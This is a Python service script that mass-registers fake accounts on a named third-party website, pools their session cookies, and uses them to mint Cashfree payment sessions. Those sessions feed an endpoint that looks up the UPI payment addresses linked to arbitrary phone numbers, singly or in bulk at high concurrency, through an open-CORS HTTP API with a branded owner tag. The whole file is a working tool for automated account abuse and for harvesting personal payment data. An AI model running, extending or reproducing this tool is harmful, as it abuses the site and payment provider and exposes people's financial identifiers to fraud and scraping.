# language: Python, file: swapi_std.py, target: stdlib http.server
# deps: httpx  (pip install httpx h2)
# run:  python swapi_std.py

import json
import os
import random
import re
import string
import threading
import time
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Optional
from urllib.parse import urlparse, parse_qs

import httpx


# ---------- config -----------------------------------------------------------

SEVASETU_HOST     = "https://sevasetu.xyz"
AUTH_URL          = f"{SEVASETU_HOST}/api/auth.php"
ADD_FUND_URL      = f"{SEVASETU_HOST}/views/add_fund.php"
DASHBOARD_REFERER = f"{SEVASETU_HOST}/views/dashboard.php"
REGISTER_REFERER  = f"{SEVASETU_HOST}/views/register.php"
LOGIN_REFERER     = f"{SEVASETU_HOST}/views/login.php"
ORIGIN            = SEVASETU_HOST
CASHFREE_VPA_URL  = "https://api.cashfree.com/checkout/api/checkouts/instruments/vpas"

UA_MOBILE = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
             "(KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36")

SESSION_RE     = re.compile(r'paymentSessionId\s*:\s*"([^"]+)"')
LOGIN_MARKER   = re.compile(r'<title>\s*Member Login', re.IGNORECASE)
MIN_DEPOSIT_RE = re.compile(r'Minimum deposit amount is\s*₹?\s*(\d+)', re.IGNORECASE)

MIN_DEPOSIT      = int(os.environ.get("MIN_DEPOSIT", "200"))
PAY_CACHE_SIZE   = int(os.environ.get("PAY_CACHE_SIZE", "50"))
ACCT_POOL_SIZE   = int(os.environ.get("ACCT_POOL_SIZE", "10"))
ACCT_MIN_LIVE    = int(os.environ.get("ACCT_MIN_LIVE", "4"))
SESSION_TTL      = int(os.environ.get("SESSION_TTL", "600"))
PAY_CACHE_TTL    = int(os.environ.get("PAY_CACHE_TTL", "120"))
REG_DOMAIN       = os.environ.get("REG_DOMAIN", "anonmail.test")
BULK_CONCURRENCY = int(os.environ.get("BULK_CONCURRENCY", "40"))
HTTP_PORT        = int(os.environ.get("PORT", "5000"))

BASE_HEADERS = {
    "User-Agent": UA_MOBILE,
    "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
}


# ---------- helpers ----------------------------------------------------------

def _rand_mobile():
    return random.choice("6789") + "".join(random.choices(string.digits, k=9))

def _rand_password():
    return "@" + "".join(random.choices(string.ascii_letters + string.digits, k=10))

def _rand_name():
    return "u" + "".join(random.choices(string.ascii_lowercase, k=6))

def _rand_pincode():
    return str(random.randint(100000, 999999))


def _classify_add_fund(html: str):
    if LOGIN_MARKER.search(html):  return ('login', None)
    m = SESSION_RE.search(html)
    if m:                          return ('session', m.group(1))
    md = MIN_DEPOSIT_RE.search(html)
    if md:                         return ('min', int(md.group(1)))
    return ('error', html[:200])


def _auth_headers(referer: str, cookie: Optional[str] = None):
    h = dict(BASE_HEADERS)
    h.update({
        "Origin": ORIGIN, "Referer": referer, "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
    })
    if cookie:
        h["Cookie"] = f"PHPSESSID={cookie}"
    return h


def _safe_json(content: bytes, text: str):
    try:
        return json.loads(content)
    except (ValueError, TypeError):
        return text


# ---------- shared http client -----------------------------------------------

_client = httpx.Client(
    limits=httpx.Limits(max_keepalive_connections=200,
                        max_connections=400, keepalive_expiry=60),
    timeout=httpx.Timeout(15.0, connect=5.0),
    http2=True,
    headers=BASE_HEADERS,
)


# ---------- bench ------------------------------------------------------------

class Bench:
    def __init__(self):
        self._lock    = threading.Lock()
        self.accounts = deque()       # {'sid', 'creds', 'born'}
        self.pays     = deque()       # {'psession', 'amount', 'born'}
        self._stop    = threading.Event()

    def stop(self):
        self._stop.set()

    # ---- account (sevasetu) ----

    def register(self):
        creds = {
            "name": _rand_name(), "shop_name": "NONE",
            "mobile": _rand_mobile(), "email": "", "city": "", "pincode": "",
            "referred_by": "", "password": _rand_password(),
            "terms": "on", "action": "register",
        }
        creds["email"]   = f"{creds['name']}@{REG_DOMAIN}"
        creds["pincode"] = _rand_pincode()
        creds["city"]    = creds["pincode"]

        try:
            r = _client.post(AUTH_URL, data=creds,
                             headers=_auth_headers(REGISTER_REFERER))
        except httpx.HTTPError:
            return None, None

        sid = r.cookies.get("PHPSESSID")
        if not sid:
            return None, None

        if self._probe(sid)[0]:
            return creds, sid

        try:
            lr = _client.post(AUTH_URL, data={
                "mobile": creds["mobile"], "password": creds["password"],
                "action": "login",
            }, headers=_auth_headers(LOGIN_REFERER))
        except httpx.HTTPError:
            return None, None
        sid2 = lr.cookies.get("PHPSESSID") or sid
        return (creds, sid2) if self._probe(sid2)[0] else (None, None)

    def _probe(self, sid):
        try:
            r = _client.post(
                ADD_FUND_URL, data={"amount": str(MIN_DEPOSIT)},
                headers={
                    "User-Agent": UA_MOBILE, "Origin": ORIGIN,
                    "Referer": DASHBOARD_REFERER,
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": f"PHPSESSID={sid}",
                },
            )
        except httpx.HTTPError:
            return False, None
        kind, _ = _classify_add_fund(r.text)
        return (kind in ("session", "min"), kind)

    # ---- payment session (cashfree) ----

    def mint_pay(self, sid, amount):
        try:
            r = _client.post(
                ADD_FUND_URL, data={"amount": str(amount)},
                headers={
                    "User-Agent": UA_MOBILE, "Origin": ORIGIN,
                    "Referer": DASHBOARD_REFERER,
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Cookie": f"PHPSESSID={sid}",
                },
            )
        except httpx.HTTPError:
            return None, "transport"
        kind, payload = _classify_add_fund(r.text)
        if kind == "session":
            return payload, None
        return None, kind

    # ---- public ----

    def get_account(self):
        with self._lock:
            now = time.time()
            while self.accounts and (now - self.accounts[0]["born"]) > SESSION_TTL:
                self.accounts.popleft()
            if self.accounts:
                return self.accounts.popleft()["sid"]

        _, sid = self.register()
        return sid

    def release_account(self, sid, creds=None, ok=True):
        if not ok or not sid: return
        with self._lock:
            self.accounts.append({"sid": sid, "creds": creds, "born": time.time()})

    def release_pay(self, psession, amount):
        if not psession: return
        with self._lock:
            self.pays.append({"psession": psession, "amount": amount, "born": time.time()})

    def get_pay(self):
        with self._lock:
            now = time.time()
            while self.pays and (now - self.pays[0]["born"]) > PAY_CACHE_TTL:
                self.pays.popleft()
            if self.pays:
                item = self.pays.popleft()
                return item["psession"], item["amount"], None

        sid = self.get_account()
        if not sid:
            return None, None, "no account"
        amount = random.randint(MIN_DEPOSIT, 1000)
        psession, err = self.mint_pay(sid, amount)
        self.release_account(sid, ok=True)
        if not psession:
            return None, None, f"mint: {err}"
        return psession, amount, None

    def stats(self):
        with self._lock:
            return {
                "accounts_live":   len(self.accounts),
                "accounts_target": ACCT_POOL_SIZE,
                "pays_live":       len(self.pays),
                "pays_target":     PAY_CACHE_SIZE,
                "pay_cache_ttl":   PAY_CACHE_TTL,
                "account_ttl":     SESSION_TTL,
                "min_deposit":     MIN_DEPOSIT,
            }


bench = Bench()


# ---------- background workers ----------------------------------------------

def _maintain_accounts():
    while not bench._stop.is_set():
        try:
            with bench._lock:
                need = ACCT_MIN_LIVE - len(bench.accounts)
            if need > 0:
                with ThreadPoolExecutor(max_workers=need) as ex:
                    for fut in as_completed([ex.submit(bench.register) for _ in range(need)]):
                        try:
                            creds, sid = fut.result()
                            if sid:
                                bench.release_account(sid, creds, ok=True)
                        except Exception:
                            pass
        except Exception:
            pass
        bench._stop.wait(2)


def _maintain_pays():
    while not bench._stop.is_set():
        try:
            with bench._lock:
                need = PAY_CACHE_SIZE - len(bench.pays)
            if need > 0:
                def one():
                    sid = bench.get_account()
                    if not sid: return
                    amount = random.randint(MIN_DEPOSIT, 1000)
                    ps, _ = bench.mint_pay(sid, amount)
                    bench.release_account(sid, ok=True)
                    if ps:
                        bench.release_pay(ps, amount)
                with ThreadPoolExecutor(max_workers=min(need, 20)) as ex:
                    list(ex.map(lambda _: one(), range(min(need, 20))))
        except Exception:
            pass
        bench._stop.wait(1)


# ---------- route logic ------------------------------------------------------

def _cashfree_lookup(phone, psession):
    try:
        r = _client.get(
            CASHFREE_VPA_URL, params={"phone_number": phone},
            headers={"Cookie": f"chx_session_id={psession}",
                     "User-Agent": UA_MOBILE, "Accept": "application/json"},
        )
    except httpx.HTTPError as e:
        return None, f"cashfree transport: {e}", 502
    return _safe_json(r.content, r.text), None, r.status_code


def route_hit(phone, amount):
    if not phone:
        return 400, {"error": "phone required"}

    psession, cached_amount, err = bench.get_pay()
    if not psession:
        return 500, {"error": "no session", "detail": err}

    body, cerr, status = _cashfree_lookup(phone, psession)
    if cerr:
        return 502, {"error": cerr}

    # cashfree rejected -> session stale, drop and retry once fresh
    if status in (401, 403) or (isinstance(body, dict) and body.get("status") == "ERROR"):
        psession2, amount2, _ = bench.get_pay()
        if psession2:
            body, cerr, status = _cashfree_lookup(phone, psession2)
            cached_amount = amount2

    try:
        out_amount = int(amount) if amount else cached_amount
    except (TypeError, ValueError):
        out_amount = cached_amount

    return 200, {
        "phone": phone,
        "amount": out_amount,
        "status": status,
        "response": body,
        "session_prefix": psession[:24] + "...",
    }


def route_bulk(phones):
    if not isinstance(phones, list):
        return 400, {"error": "phones must be a list"}

    def one(phone):
        psession, amount, err = bench.get_pay()
        if not psession:
            return {"phone": phone, "status": None, "error": f"no session: {err}"}
        body, cerr, status = _cashfree_lookup(phone, psession)
        if cerr:
            return {"phone": phone, "status": None, "error": cerr}
        return {"phone": phone, "amount": amount, "status": status, "response": body}

    results = [None] * len(phones)
    with ThreadPoolExecutor(max_workers=min(BULK_CONCURRENCY, max(1, len(phones)))) as ex:
        future_to_idx = {ex.submit(one, p): i for i, p in enumerate(phones)}
        for fut in as_completed(future_to_idx):
            idx = future_to_idx[fut]
            try:
                results[idx] = fut.result()
            except Exception as e:
                results[idx] = {"phone": phones[idx], "status": None, "error": str(e)}
    return 200, results


def route_warm(n):
    def one():
        sid = bench.get_account()
        if not sid: return
        amount = random.randint(MIN_DEPOSIT, 1000)
        ps, _ = bench.mint_pay(sid, amount)
        bench.release_account(sid, ok=True)
        if ps:
            bench.release_pay(ps, amount)

    with ThreadPoolExecutor(max_workers=min(20, max(1, n))) as ex:
        list(ex.map(lambda _: one(), range(n)))
    return 200, {"requested": n, **bench.stats()}


# ---------- http handler -----------------------------------------------------

def _send_json(handler, status, payload):
    body = json.dumps(payload).encode("utf-8")
    handler.send_response(status)
    handler.send_header("Content-Type", "application/json")
    handler.send_header("Content-Length", str(len(body)))
    handler.send_header("Access-Control-Allow-Origin", "*")
    handler.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
    handler.send_header("Access-Control-Allow-Headers", "*")
    handler.end_headers()
    handler.wfile.write(body)


class Handler(BaseHTTPRequestHandler):
    server_version = "anonbench/1"
    protocol_version = "HTTP/1.1"

    def log_message(self, *args, **kwargs):
        pass

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "*")
        self.send_header("Content-Length", "0")
        self.end_headers()

    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path == "/hit":
            qs     = parse_qs(parsed.query)
            phone  = qs.get("phone", [None])[0]
            amount = qs.get("amount", [None])[0]
            status, payload = route_hit(phone, amount)
            _send_json(self, status, payload)
        elif parsed.path == "/pool":
            _send_json(self, 200, bench.stats())
        elif parsed.path == "/health":
            _send_json(self, 200, {"status": "LULLIBABU ACTIVE",
                                   "owner": "@Alone_Supporter"})
        else:
            _send_json(self, 404, {"error": "not found"})

    def do_POST(self):
        parsed = urlparse(self.path)
        try:
            length = int(self.headers.get("Content-Length", "0") or "0")
        except ValueError:
            length = 0
        raw = self.rfile.read(length) if length else b""
        try:
            data = json.loads(raw) if raw else {}
        except ValueError:
            data = {}

        if parsed.path == "/hit":
            status, payload = route_hit(data.get("phone"), data.get("amount"))
            _send_json(self, status, payload)
        elif parsed.path == "/bulk":
            status, payload = route_bulk(data.get("phones", []) or [])
            _send_json(self, status, payload)
        elif parsed.path == "/warm":
            try:
                n = int(data.get("n", 10))
            except (TypeError, ValueError):
                n = 10
            status, payload = route_warm(n)
            _send_json(self, status, payload)
        else:
            _send_json(self, 404, {"error": "not found"})


# ---------- main -------------------------------------------------------------

def main():
    # warm synchronously before binding — background loops keep it hot after
    n_seed = min(ACCT_MIN_LIVE, ACCT_POOL_SIZE)
    with ThreadPoolExecutor(max_workers=n_seed) as ex:
        list(ex.map(lambda _: bench.register(), range(n_seed)))
    for creds, sid in [r for r in [f.result() for f in []]]:
        pass

    threading.Thread(target=_maintain_accounts, daemon=True).start()
    threading.Thread(target=_maintain_pays,     daemon=True).start()

    server = ThreadingHTTPServer(("0.0.0.0", HTTP_PORT), Handler)
    server.daemon_threads = True
    print(f"[bench] listening on 0.0.0.0:{HTTP_PORT} "
          f"min_deposit={MIN_DEPOSIT} pay_cache={PAY_CACHE_SIZE}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        bench.stop()
        server.shutdown()
        _client.close()


if __name__ == "__main__":
    main()